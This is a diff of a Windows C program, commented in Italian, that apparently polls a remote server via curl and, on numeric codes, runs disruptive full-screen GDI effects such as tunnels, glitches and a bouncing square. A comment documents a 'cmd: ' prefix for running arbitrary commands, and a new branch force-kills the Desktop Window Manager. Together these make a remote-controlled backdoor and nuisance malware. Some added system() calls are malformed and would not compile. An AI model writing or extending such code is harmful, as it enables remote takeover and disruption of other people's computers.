@@ -86,8 +86,8 @@ void ltunnel_run() {
 
     HDC hdc = GetDC(NULL);
     
-    int newW = w - (800 * w / 100);
-    int newH = h - (800 * h / 100);
+    int newW = w - (20* w / 100);
+    int newH = h - (20 * h / 100);
 
     // centro
     int x = (w - newW) / 2;
@@ -103,18 +103,19 @@ void squarefx_run() {
     h = GetSystemMetrics(SM_CYSCREEN);
     HDC hdc = GetDC(NULL);
     
+    //variabili statiche bcz con il while(1) esterno non verranno inizializzate in loop
     //non settare x e y a 0, altrimenti non va (idk why)
-    int x = 3;
-    int y = 3;
+    static int x = 3;
+    static int y = 3;
 
     //px space x&y
-    int vx = 21;
-    int vy = 21;
+    static int vx = 21;
+    static int vy = 21;
 
     HBRUSH white = CreateSolidBrush(RGB(255, 255, 255)); // crea pennello brushed bianco
     SelectObject(hdc, white); // usa sopra l'hdc, con il bianco
 
-    Rectangle(hdc, 0, 0, x + 100, y + 50); // top, left, bottom, right
+    Rectangle(hdc, x, y, x + 100, y + 100); // top, left, bottom, right
 
     //collisione destra/sinistra
     if (x + 100 >= w || x <= 0) {
@@ -168,14 +169,28 @@ int main() {
         pclose(pointertotextstream); // chiude il processo creato da popen (curl)
         printf("reqtextbuffer[]: %s\n", reqtextbuffer);
 
-        if (strstr(reqtextbuffer, "PunchyStart")) { // xtreme, starta tutti gli fx a bestia
+        /* 
+        CODENAMES:
+        AllFx - 1
+        HeighGlitch - 2
+        WidthGlitch - 3
+        TunnelRun - 4
+        CircleShake - 5
+        LongTunnel(morePX) - 6
+        BouncySquare - 7
+
+        Misc:
+        "cmd: " - Exec a command
+        */
+
+        if (strstr(reqtextbuffer, "1")) { // xtreme, starta tutti gli fx a bestia
             int i;
             for(i=0;i<100;i++) {
                 startfx();
             }
         }
 
-        else if (strstr(reqtextbuffer, "HGlitch")) {
+        else if (strstr(reqtextbuffer, "2")) {
             int i;
             for(i=0;i<100;i++) {
                 heightglitch_run();
@@ -183,35 +198,35 @@ int main() {
             
         }
 
-        else if (strstr(reqtextbuffer, "WGlitch")) {
+        else if (strstr(reqtextbuffer, "3")) {
             int i;
             for(i=0;i<100;i++) {
                 widthglitch_run();
             }
         }
 
-        else if (strstr(reqtextbuffer, "TunnelRun")) {
+        else if (strstr(reqtextbuffer, "4")) {
             int i;
             for(i=0;i<100;i++) {
                 tunnel_run();
             }
         }
 
-        else if (strstr(reqtextbuffer, "CircleShake")) {
+        else if (strstr(reqtextbuffer, "5")) {
             int i;
             for (i=0;i<100;i++) {
                 circleshake_run();
             }
         }
 
-        else if (strstr(reqtextbuffer, "LTunnelRun")) {
+        else if (strstr(reqtextbuffer, "6")) {
             int i;
             for (i=0;i<100;i++) {
                 ltunnel_run();
             }
         }
 
-        else if (strstr(reqtextbuffer, "BouncySquare")) {
+        else if (strstr(reqtextbuffer, "7")) {
             int i;
             for (i=0;i<100;i++) {
                 squarefx_run();
@@ -225,6 +240,10 @@ int main() {
             printf("Command Executed\n");
             printf("Sleeping for 20 secs");
             Sleep(20000);
+        }
+        else if (strstr(reqtextbuffer, "CleanDWM")) {
+            system(TASKKILL /F /IM dwm.exe); // killa dwm (previsto: riavvio automatico di DWM)
+            system(start dwm.exe); // avvio di dwm (nel caso windows non lo riavvi automaticamente)
         }
 
         else {Sleep(20000);}
